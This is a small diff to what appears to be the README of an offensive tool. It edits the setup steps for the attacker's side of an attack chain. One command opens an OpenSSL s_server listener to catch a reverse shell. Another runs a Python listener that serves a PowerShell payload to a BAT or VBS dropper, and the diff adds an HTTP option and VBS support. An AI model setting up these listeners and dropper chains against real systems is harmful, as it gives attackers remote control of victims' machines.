@@ -68,9 +68,9 @@ Opening a listener with the OpenSSL server to receive the Reverse shell connecti
 ```bash
 openssl s_server -accept <Your_PORT> -cert reception.pem -key reception.key -quiet
 ```
-and opening a listener with our server to handle the initial connection for downloading the PS1 file from the BAT file:
+open a listener with our server to handle the initial connection for downloading the PS1 file from the BAT/VBS file:
 ```bash
-python3 listener.py -https_port <Your_Listener_Server_PORT>
+python3 listener.py -https_port|-http_port <Your_Listener_Server_PORT>
 ```
 
 
